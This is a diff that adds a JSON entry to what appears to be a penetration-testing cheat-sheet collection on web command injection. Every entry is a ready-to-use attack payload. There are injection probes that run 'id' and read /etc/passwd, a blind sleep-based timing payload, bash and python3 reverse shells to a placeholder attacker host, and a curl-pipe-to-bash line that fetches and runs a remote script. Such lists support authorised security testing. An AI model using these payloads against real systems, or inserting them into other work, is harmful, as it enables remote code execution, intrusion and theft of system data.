@@ -1,0 +1,26 @@
+{
+  "category": "Web – Command Injection",
+  "description": "Test chars, blind timing & reverse shells",
+  "cheats": [
+    {
+      "title": "Injection probes",
+      "content": "; id\n&& whoami\n| cat /etc/passwd"
+    },
+    {
+      "title": "Blind – time delay (Linux)",
+      "content": "test; sleep 5 #"
+    },
+    {
+      "title": "Reverse shell (bash)",
+      "content": "bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"
+    },
+    {
+      "title": "Reverse shell (python3)",
+      "content": "python3 -c 'import os,pty,socket,subprocess;s=socket.socket();s.connect((\"<LHOST>\",<LPORT>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
+    },
+    {
+      "title": "Execute remote script quickly",
+      "content": "curl -s http://<LHOST>/r.sh | bash"
+    }
+  ]
+}
